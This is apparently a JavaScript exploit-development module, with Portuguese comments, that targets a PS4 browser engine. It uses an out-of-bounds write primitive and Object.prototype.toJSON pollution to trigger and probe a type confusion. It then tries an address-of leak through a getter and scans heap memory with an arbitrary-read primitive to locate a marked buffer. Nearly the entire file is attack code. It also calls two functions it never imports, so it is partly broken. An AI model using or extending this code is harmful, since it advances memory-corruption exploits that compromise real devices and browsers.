// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R26)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, 
    clearOOBEnvironment,
    arb_read, 
    oob_write_absolute, 
    isOOBReady,
    oob_array_buffer_real // Importar para acesso direto ao buffer para plantar marcador
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; 
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; // Apenas uma iteração para este teste de scan

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 

// Configurações para o Scan de Memória
const SCAN_MARKER_VALUE = new AdvancedInt64(0x41424344, 0x45464748); // "ABCDEFGH"
const SCAN_MARKER_OFFSET_IN_OOB_BUFFER = 0x100; // Onde plantaremos o marcador no oob_array_buffer_real
// ATENÇÃO: Estes endereços de scan são HIPOTÉTICOS e precisam ser ajustados para o ambiente PS4 real.
const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); // Exemplo: Início de uma possível região de heap
const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8F000000);   // Exemplo: Fim da região
const SCAN_STEP = 0x1000; // Pular de 4KB em 4KB

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R26() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R26`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + Memory Scan for OOB Buffer (R26) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R26...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, 
        tc_probe_details: null, 
        stringifyResult: null,
        memory_scan_result: { success: false, msg: "Memory scan: Not run.", found_at_address: null, oob_buffer_base_addr: null },
        oob_value_used: null, 
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R26: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_R26: `LeakA_OOB_Val${toHex(current_oob_value)}`}; // Não usado para addrof nesta versão
        const current_object_to_leak_B = { marker_B_R26: `LeakB_OOB_Val${toHex(current_oob_value)}`};
        
        function toJSON_TA_Probe_Iter_Closure_R26() { /* ... (sonda como na R25, apenas atualizando logs para R26) ... */ 
            probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
            const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
            logS3(`[PROBE_R26] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R26"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R26",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R26",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R26] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            if(iteration_final_tc_details_from_probe&&(!this.hasOwnProperty('leaky_A_getter_v82')||iteration_final_tc_details_from_probe.call_number_tc_detected===call_num)){try{Object.defineProperty(this,'leaky_A_getter_v82',{get:function(){const det=iteration_final_tc_details_from_probe;if(det)det.getter_fired=true;if(!victim_typed_array_ref_iter?.buffer){if(det)det.leak_val_getter_int64="getter_victim_null";return"getter_victim_null";}
            let lvf=NaN,lis="getter_err_r26";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
            return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
        }

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_memory_scan_result = { success: false, msg: "Memory scan: Not run.", found_at_address: null, oob_buffer_base_addr: null };
        let heisenbugConfirmedThisIter = false; 
        
        try { 
            logS3(`  --- Fase 1 (R26): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            const ppKey='toJSON'; let origDesc=Object.getOwnPropertyDescriptor(Object.prototype,ppKey); let polluted=false;
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R26,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R26: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                try{iter_stringify_output_parsed=JSON.parse(iter_raw_stringify_output);}catch(e_p){iter_stringify_output_parsed={err_parse:iter_raw_stringify_output};}
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R26: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                    if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                }else{logS3(` TC Probe R26: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
            }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
            logS3(`  --- Fase 1 (R26) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);

            // Fase 2: Teste de Memory Scan usando arb_read
            logS3(`  --- Fase 2 (R26): Memory Scan for OOB Buffer Marker ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter) { // Prossegue para o scan apenas se a TC (setup OOB) funcionou
                try {
                    // Garante que o ambiente OOB para arb_read está pronto (oob_dataview_real com m_length expandido)
                    // oob_array_buffer_real já deve estar definido pela TCSetup e é o buffer que queremos encontrar.
                    await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-MemScanSetup` }); // Não força reinit, usa o existente
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-MemScanSetup`)) {
                        throw new Error("Ambiente OOB não pronto para Memory Scan.");
                    }

                    // Plantar o marcador no oob_array_buffer_real usando oob_write_absolute
                    // oob_write_absolute opera em offsets dentro do oob_array_buffer_real
                    logS3(`  MemScan: Plantando marcador ${SCAN_MARKER_VALUE.toString(true)} em oob_array_buffer_real[${toHex(SCAN_MARKER_OFFSET_IN_OOB_BUFFER)}]...`, 'info');
                    oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER, SCAN_MARKER_VALUE, 8);
                    const verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER, 8);
                    if (!verify_marker.equals(SCAN_MARKER_VALUE)) {
                        throw new Error(`Falha ao plantar/verificar marcador no oob_array_buffer_real. Lido: ${verify_marker.toString(true)}`);
                    }
                    logS3(`  MemScan: Marcador plantado e verificado com sucesso.`, 'good');

                    logS3(`  MemScan: Iniciando varredura de memória de ${SCAN_HEAP_START_ADDRESS.toString(true)} a ${SCAN_HEAP_END_ADDRESS.toString(true)}...`, 'warn');
                    let found_marker_addr = null;
                    for (let current_scan_addr = SCAN_HEAP_START_ADDRESS.clone(); current_scan_addr.lessThanOrEqual(SCAN_HEAP_END_ADDRESS); current_scan_addr = current_scan_addr.add(SCAN_STEP)) {
                        // Logar progresso a cada N scans para não poluir demais
                        if (current_scan_addr.low() % (SCAN_STEP * 100) === 0) {
                             logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)}...`, 'debug');
                        }
                        try {
                            const value_at_addr = await arb_read(current_scan_addr, 8);
                            if (value_at_addr.equals(SCAN_MARKER_VALUE)) {
                                found_marker_addr = current_scan_addr.clone();
                                iter_memory_scan_result.found_at_address = found_marker_addr.toString(true);
                                iter_memory_scan_result.oob_buffer_base_addr = found_marker_addr.sub(SCAN_MARKER_OFFSET_IN_OOB_BUFFER).toString(true);
                                iter_memory_scan_result.success = true;
                                iter_memory_scan_result.msg = `Marcador encontrado em ${found_marker_addr.toString(true)}! Base OOB estimada: ${iter_memory_scan_result.oob_buffer_base_addr}`;
                                logS3(`  MemScan: SUCESSO! ${iter_memory_scan_result.msg}`, "vuln", FNAME_CURRENT_ITERATION);
                                break; 
                            }
                        } catch (e_scan_read) {
                            // É esperado que algumas leituras falhem (endereços inválidos)
                            if (current_scan_addr.low() % (SCAN_STEP * 500) === 0) { // Logar erros de leitura esporadicamente
                                logS3(`  MemScan: Erro ao ler ${current_scan_addr.toString(true)}: ${e_scan_read.message}`, 'dev_verbose');
                            }
                        }
                        await PAUSE(0); // Permite que a UI respire um pouco durante o scan
                    }
                    if (!found_marker_addr) {
                        iter_memory_scan_result.msg = `MemScan: Marcador não encontrado na faixa especificada.`;
                        logS3(`  MemScan: ${iter_memory_scan_result.msg}`, "warn", FNAME_CURRENT_ITERATION);
                    }

                } catch (e_mem_scan) {
                    iter_memory_scan_result.msg = `MemScan EXCEPTION: ${e_mem_scan.message || String(e_mem_scan)}`;
                    logS3(`  MemScan: ${iter_memory_scan_result.msg}`, "critical", FNAME_CURRENT_ITERATION);
                    if (!iter_primary_error) iter_primary_error = e_mem_scan;
                }
            } else {
                iter_memory_scan_result.msg = "Memory scan: Pulado porque a TC da Fase 1 falhou.";
                logS3(`  MemScan: ${iter_memory_scan_result.msg}`, "warn", FNAME_CURRENT_ITERATION);
            }
            logS3(`  --- Fase 2 (R26) Concluída. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer; logS3(`  CRITICAL ERROR ITERATION R26: ${e_outer.message || String(e_outer)}`, "critical");}
        finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR26`});}

        final_probe_call_count_for_report = probe_call_count_iter;
        
        let current_iter_summary = { 
            oob_value:toHex(current_oob_value), error:iter_primary_error?(iter_primary_error.message||String(iter_primary_error)):null,
            tc_probe_details:iteration_final_tc_details_from_probe?JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)):null, 
            stringifyResult:iter_stringify_output_parsed,
            memory_scan_result_this_iter: iter_memory_scan_result, 
            heisenbug_on_M2_confirmed_by_tc_probe:heisenbugConfirmedThisIter 
        };
        iteration_results_summary.push(current_iter_summary);
        
        // Lógica para best_result_for_runner (R26)
        let tc_ok = heisenbugConfirmedThisIter;
        let scan_ok = iter_memory_scan_result.success;

        if (scan_ok) { // Prioridade máxima: scan bem-sucedido
            if (!best_result_for_runner.memory_scan_result?.success) {
                best_result_for_runner = { ...current_iter_summary };
            }
        } else if (tc_ok && !best_result_for_runner.memory_scan_result?.success) { 
            if (!best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe || !best_result_for_runner.oob_value_used ) {
                 best_result_for_runner = { ...current_iter_summary };
            }
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { ...current_iter_summary };
        }
        
        if(scan_ok)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R26: Scan OK!`;
        else if(tc_ok)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R26: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R26: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R26): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { 
        errorOccurred:best_result_for_runner.errorOccurred, 
        tc_probe_details:best_result_for_runner.tc_probe_details, 
        stringifyResult:best_result_for_runner.stringifyResult, 
        memory_scan_result: best_result_for_runner.memory_scan_result, 
        iteration_results_summary:iteration_results_summary, 
        total_probe_calls_last_iter:final_probe_call_count_for_report,
        oob_value_of_best_result:best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result:best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
